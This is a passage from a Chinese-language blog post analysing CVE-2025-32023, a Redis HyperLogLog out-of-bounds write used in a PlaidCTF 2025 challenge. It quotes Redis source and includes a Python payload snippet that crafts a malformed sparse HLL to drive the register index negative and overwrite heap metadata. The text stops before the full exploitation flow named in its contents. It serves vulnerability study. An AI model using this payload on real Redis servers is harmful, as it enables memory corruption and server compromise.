<!DOCTYPE html>
<html lang=EN>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta property="og:type" content="article">
<meta property="og:title" content="CVE-2025-32023 Redis  漏洞分析">
<meta property="og:url" content="https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html">
<meta property="og:site_name" content="Swing&#39;Blog 浮生若梦">
<meta property="og:locale">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-11-dd6ba4cc0ca1be110782321dd59e6908-4b5138.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-11-bd320665ad21fcff8300fdc9e2e0270c-3ac98d.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-11-619c1f3013ee7e5cc66707310d32facb-5d6e72.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-12-95209fbc6852fb89f57affe6eb949558-01f569.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-11-9df67aa6e235c5363cfae11b4eb03208-4a48ae.png">
<meta property="article:published_time" content="2025-07-07T19:32:43.000Z">
<meta property="article:modified_time" content="2025-07-11T18:06:49.970Z">
<meta property="article:author" content="Swing">
<meta property="article:tag" content="redis">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-11-dd6ba4cc0ca1be110782321dd59e6908-4b5138.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>CVE-2025-32023 Redis  漏洞分析</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 浮生若梦" type="application/atom+xml" />
    
<meta name="generator" content="Hexo 5.4.2"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html&text=CVE-2025-32023 Redis  漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html&title=CVE-2025-32023 Redis  漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html&is_video=false&description=CVE-2025-32023 Redis  漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2025-32023 Redis  漏洞分析&body=Check out this article: https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html&title=CVE-2025-32023 Redis  漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html&title=CVE-2025-32023 Redis  漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html&title=CVE-2025-32023 Redis  漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html&title=CVE-2025-32023 Redis  漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html&name=CVE-2025-32023 Redis  漏洞分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html&t=CVE-2025-32023 Redis  漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2025-32023"><span class="toc-number">1.</span> <span class="toc-text">CVE-2025-32023</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PoC-%E6%9E%84%E9%80%A0"><span class="toc-number">1.2.</span> <span class="toc-text">PoC 构造</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E8%B6%8A%E7%95%8C-payload"><span class="toc-number">1.2.1.</span> <span class="toc-text">构造越界 payload</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E8%B6%8A%E7%95%8C%E5%86%99%E7%9B%AE%E6%A0%87"><span class="toc-number">1.2.2.</span> <span class="toc-text">寻找越界写目标</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E7%9A%84%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number"></span> <span class="toc-text">完整的利用流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference-link"><span class="toc-number"></span> <span class="toc-text">Reference link</span></a>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        CVE-2025-32023 Redis  漏洞分析
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Swing</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-07-07T19:32:43.000Z" itemprop="datePublished">2025-07-08</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/redis/" rel="tag">redis</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h2><p>漏洞分析版本： <code>commit a0a6f23d997b024689ba157916837f493a593a34 (HEAD, tag: 7.4.2)</code></p>
<p>该漏洞是 PlaidCTF 2025 “Zerodeo” 题目。</p>
<h3 id="CVE-2025-32023"><a href="#CVE-2025-32023" class="headerlink" title="CVE-2025-32023"></a>CVE-2025-32023</h3><p>Redis 在调用 <code>pfmerge</code> 命令的时候会调用 <code>hyperloglog.c</code> 里的 <code>void pfmergeCommand(client *c)</code> 函数</p>
<p><code>pfmerge</code> <sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://redis.io/docs/latest/commands/pfmerge/">[1]</span></a></sup> 的作用是将多个 HLL 的数据合并到一个目标 key 中， 是用来合并多个 HypeLogLog （HLL）数据。 对格式错误的 HLL 进行操作时，可能会使 int i 中计数的总长度溢出为负值。这允许攻击者覆盖 HLL 结构上的负偏移量，从而导致栈/堆上的越界写。 (eg: <code>hllMerge()</code> 函数中会发生栈越界， <code>hllSparseToDense()</code> 发生堆越界写）</p>
<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* PFMERGE dest src1 src2 src3 ... srcN =&gt; OK */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pfmergeCommand</span><span class="params">(client *c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> max[HLL_REGISTERS];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hllhdr</span> *<span class="title">hdr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">int</span> use_dense = <span class="number">0</span>; <span class="comment">/* Use dense representation as target? */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Compute an HLL with M[i] = MAX(M[i]_j).</span></span><br><span class="line"><span class="comment">     * We store the maximum into the max array of registers. We&#x27;ll write</span></span><br><span class="line"><span class="comment">     * it to the target variable later. */</span></span><br><span class="line">    <span class="built_in">memset</span>(max,<span class="number">0</span>,<span class="keyword">sizeof</span>(max));</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; c-&gt;argc; j++) &#123;</span><br><span class="line">			...</span><br><span class="line">        <span class="comment">/* Merge with this HLL with our &#x27;max&#x27; HLL by setting max[i]</span></span><br><span class="line"><span class="comment">         * to MAX(max[i],hll[i]). */</span></span><br><span class="line">        <span class="keyword">if</span> (hllMerge(max,o) == C_ERR) &#123; <span class="comment">// hllMerge [1] stack oob write</span></span><br><span class="line">			...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">			</span><br><span class="line">    <span class="comment">/* Convert the destination object to dense representation if at least</span></span><br><span class="line"><span class="comment">     * one of the inputs was dense. */</span></span><br><span class="line">    <span class="keyword">if</span> (use_dense &amp;&amp; hllSparseToDense(o) == C_ERR) &#123; <span class="comment">// hllSparseToDense [2] heap oob write</span></span><br><span class="line">			...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>hllSparseToDense</code> 函数中会造成堆相关的越界写， 作者的漏洞利用也是用的这个漏洞原语。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hllSparseToDense</span><span class="params">(robj *o)</span> </span>&#123;</span><br><span class="line">    sds sparse = o-&gt;ptr, dense;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hllhdr</span> *<span class="title">hdr</span>, *<span class="title">oldhdr</span> =</span> (struct hllhdr*)sparse;</span><br><span class="line">    <span class="keyword">int</span> idx = <span class="number">0</span>, runlen, regval;</span><br><span class="line">    <span class="keyword">uint8_t</span> *p = (<span class="keyword">uint8_t</span>*)sparse, *end = p+sdslen(sparse);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If the representation is already the right one return ASAP. */</span></span><br><span class="line">    hdr = (struct hllhdr*) sparse;</span><br><span class="line">    <span class="keyword">if</span> (hdr-&gt;encoding == HLL_DENSE) <span class="keyword">return</span> C_OK;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create a string of the right size filled with zero bytes.</span></span><br><span class="line"><span class="comment">     * Note that the cached cardinality is set to 0 as a side effect</span></span><br><span class="line"><span class="comment">     * that is exactly the cardinality of an empty HLL. */</span></span><br><span class="line">    dense = sdsnewlen(<span class="literal">NULL</span>,HLL_DENSE_SIZE);</span><br><span class="line">    hdr = (struct hllhdr*) dense;</span><br><span class="line">    *hdr = *oldhdr; <span class="comment">/* This will copy the magic and cached cardinality. */</span></span><br><span class="line">    hdr-&gt;encoding = HLL_DENSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Now read the sparse representation and set non-zero registers</span></span><br><span class="line"><span class="comment">     * accordingly. */</span></span><br><span class="line">    p += HLL_HDR_SIZE;</span><br><span class="line">    <span class="keyword">while</span>(p &lt; end) &#123;</span><br><span class="line">        <span class="keyword">if</span> (HLL_SPARSE_IS_ZERO(p)) &#123;</span><br><span class="line">            runlen = HLL_SPARSE_ZERO_LEN(p);</span><br><span class="line">            idx += runlen;</span><br><span class="line">            p++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (HLL_SPARSE_IS_XZERO(p)) &#123;</span><br><span class="line">            runlen = HLL_SPARSE_XZERO_LEN(p);</span><br><span class="line">            idx += runlen;</span><br><span class="line">            p += <span class="number">2</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            runlen = HLL_SPARSE_VAL_LEN(p);</span><br><span class="line">            regval = HLL_SPARSE_VAL_VALUE(p);</span><br><span class="line">            <span class="keyword">if</span> ((runlen + idx) &gt; HLL_REGISTERS) <span class="keyword">break</span>; <span class="comment">/* Overflow. */</span></span><br><span class="line">            <span class="keyword">while</span>(runlen--) &#123;</span><br><span class="line">                HLL_DENSE_SET_REGISTER(hdr-&gt;registers,idx,regval);</span><br><span class="line">                idx++;</span><br><span class="line">            &#125;</span><br><span class="line">            p++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If the sparse representation was valid, we expect to find idx</span></span><br><span class="line"><span class="comment">     * set to HLL_REGISTERS. */</span></span><br><span class="line">    <span class="keyword">if</span> (idx != HLL_REGISTERS) &#123;</span><br><span class="line">        sdsfree(dense);</span><br><span class="line">        <span class="keyword">return</span> C_ERR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Free the old representation and set the new one. */</span></span><br><span class="line">    sdsfree(o-&gt;ptr);</span><br><span class="line">    o-&gt;ptr = dense;</span><br><span class="line">    <span class="keyword">return</span> C_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>while 循环之前是对 HLL 数据的的部分 header 解析，之后是一个转换过程。 HLL 数据是一种 SDS <sup id="fnref:2"><a href="#fn:2" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://redis.io/docs/latest/operate/oss_and_stack/reference/internals/internals-sds/">[2]</span></a></sup>字符串的表示。 我们可以用 <code>set</code> 命令来伪造一个 HLL 数据。</p>
<p>while 循环过程中，是将 HLL 的数据从 <code>sparse</code> 转换成 <code>dense</code>。 在转换过程中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(p &lt; end) &#123;</span><br><span class="line">    <span class="keyword">if</span> (HLL_SPARSE_IS_ZERO(p)) &#123;</span><br><span class="line">        runlen = HLL_SPARSE_ZERO_LEN(p);</span><br><span class="line">        idx += runlen;</span><br><span class="line">        p++;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (HLL_SPARSE_IS_XZERO(p)) &#123;</span><br><span class="line">        runlen = HLL_SPARSE_XZERO_LEN(p);</span><br><span class="line">        idx += runlen;</span><br><span class="line">        p += <span class="number">2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        runlen = HLL_SPARSE_VAL_LEN(p);</span><br><span class="line">        regval = HLL_SPARSE_VAL_VALUE(p);</span><br><span class="line">        <span class="keyword">if</span> ((runlen + idx) &gt; HLL_REGISTERS) <span class="keyword">break</span>; <span class="comment">/* Overflow. */</span></span><br><span class="line">        <span class="keyword">while</span>(runlen--) &#123;</span><br><span class="line">            HLL_DENSE_SET_REGISTER(hdr-&gt;registers,idx,regval);</span><br><span class="line">            idx++;</span><br><span class="line">        &#125;</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果当前的数据既不是 <code>HLL_SPARSE_IS_ZERO</code> 也不是 <code>HLL_SPARSE_IS_XZERO</code> 会进入到  <code>HLL_DENSE_SET_REGISTER</code> 函数， 在进到 <code>HLL_DENSE_SET_REGISTER</code> 函数之前有一个判断这个 idx 是否越界。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((runlen + idx) &gt; HLL_REGISTERS) <span class="keyword">break</span>; <span class="comment">/* Overflow. */</span></span><br></pre></td></tr></table></figure>

<p><code>runlen</code> 和 <code>idx</code> 都是一个 int 类型的变量， ， 而 idx 的值可以在 <code>HLL_SPARSE_IS_ZERO</code> 或者 <code>HLL_SPARSE_IS_ZERO</code> 条件下语句中累加而成。</p>
<p>我们可以通过构造 HLL 数据， 让 idx 不断累加成一个负数。</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-11-dd6ba4cc0ca1be110782321dd59e6908-4b5138.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-11-dd6ba4cc0ca1be110782321dd59e6908-4b5138.png" alt="image.png"></a></p>
<p>然后在 <code>HLL_DENSE_SET_REGISTER</code> 函数中就会发生越界</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HLL_DENSE_SET_REGISTER(p,regnum,val) do &#123; \</span></span><br><span class="line">    <span class="keyword">uint8_t</span> *_p = (<span class="keyword">uint8_t</span>*) p; \</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> _byte = (regnum)*HLL_BITS/<span class="number">8</span>; \</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> _fb = (regnum)*HLL_BITS&amp;<span class="number">7</span>; \</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> _fb8 = <span class="number">8</span> - _fb; \</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> _v = (val); \</span><br><span class="line">    _p[_byte] &amp;= ~(HLL_REGISTER_MAX &lt;&lt; _fb); \</span><br><span class="line">    _p[_byte] |= _v &lt;&lt; _fb; \</span><br><span class="line">    _p[_byte+<span class="number">1</span>] &amp;= ~(HLL_REGISTER_MAX &gt;&gt; _fb8); \</span><br><span class="line">    _p[_byte+<span class="number">1</span>] |= _v &gt;&gt; _fb8; \</span><br><span class="line">&#125; <span class="keyword">while</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h4 id="PoC-构造"><a href="#PoC-构造" class="headerlink" title="PoC 构造"></a>PoC 构造</h4><h5 id="构造越界-payload"><a href="#构造越界-payload" class="headerlink" title="构造越界 payload"></a>构造越界 payload</h5><p>HLL 结构大致如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 1. HLL 总体结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hllhdr</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> magic[<span class="number">4</span>];      <span class="comment">/* &quot;HYLL&quot; */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> encoding;   <span class="comment">/* HLL_DENSE or HLL_SPARSE. */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> notused[<span class="number">3</span>]; <span class="comment">/* Reserved for future use, must be zero. */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> card[<span class="number">8</span>];    <span class="comment">/* Cached cardinality, little endian. */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> registers[]; <span class="comment">/* Data bytes. */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HLL_P 14 <span class="comment">/* The greater is P, the smaller the error. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HLL_REGISTERS (1&lt;&lt;HLL_P) <span class="comment">/* With P=14, 16384 registers. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HLL_DENSE_SIZE (HLL_HDR_SIZE+((HLL_REGISTERS*HLL_BITS+7)/8))</span></span><br><span class="line"></span><br><span class="line">  +---------+----------+-----------+--------+-----------</span><br><span class="line">  | <span class="string">&quot;HYLL&quot;</span>  | encoding |  noused   | card   | registers</span><br><span class="line">  +---------+----------+--------------------+-----------</span><br><span class="line">   <span class="number">4</span>字节      <span class="number">1</span>字节        <span class="number">3</span>字节       <span class="number">8</span>字节    <span class="number">12288</span>字节</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>稀疏（Sparse）编码<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+---------+----------+---------+---------+-------------------+</span><br><span class="line">| <span class="string">&quot;HYLL&quot;</span>  |  <span class="number">0x01</span>    | 保留<span class="number">3</span>字节 | 保留<span class="number">8</span>字节 | 指令流（<span class="number">2</span>字节/条） |</span><br><span class="line">+---------+----------+---------+---------+-------------------+</span><br></pre></td></tr></table></figure>


</li>
</ol>
<p>从作者的exploit<sup id="fnref:3"><a href="#fn:3" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://github.com/leesh3288/CVE-2025-32023">[3]</span></a></sup>可以看到， 作者通过构造如下的  HLL sparse  让在代码在转换的时候能计算出来一个负数的idx</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pl = <span class="string">b&#x27;HYLL&#x27;</span>·</span><br><span class="line">pl += p8(HLL_SPARSE) + p8(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">pl += p8(<span class="number">0</span>)*<span class="number">8</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(pl) == <span class="number">0x10</span></span><br><span class="line">pl += xzero(<span class="number">0x4000</span>) * <span class="number">0x3fffd</span>   <span class="comment"># -0xc000</span></span><br><span class="line">pl += xzero(<span class="number">0xc000</span> - <span class="number">0x956c</span>)    <span class="comment"># -0x956c, where divmod(-0x956c*6, 8) = (-0x7011, 0)</span></span><br><span class="line">pl += p8(<span class="number">0b1_00011_00</span>)          <span class="comment"># runlen = 1, regval = 4 = SDS_TYPE_64 =&gt; -0x956b, overwrite sds:b type</span></span><br><span class="line">pl += xzero(<span class="number">0x156b</span>)             <span class="comment"># -0x8000</span></span><br><span class="line">pl += xzero(<span class="number">0x4000</span>) * <span class="number">3</span>         <span class="comment"># 0x4000</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">r.<span class="built_in">set</span>(<span class="string">&#x27;hll:expp&#x27;</span>, pl)</span><br></pre></td></tr></table></figure>

<p>可以看到有一段 <code>xzero(0x4000) * 0x3fffd</code> 的数据， 可以通过这样数据，就构造 0x3fffd 轮次的  0x4000 idx 累加， 在加上后面的 <code>pl += xzero(0xc000 - 0x956c)</code>  数据，最后就能构造一个负数的 <code>idx</code></p>
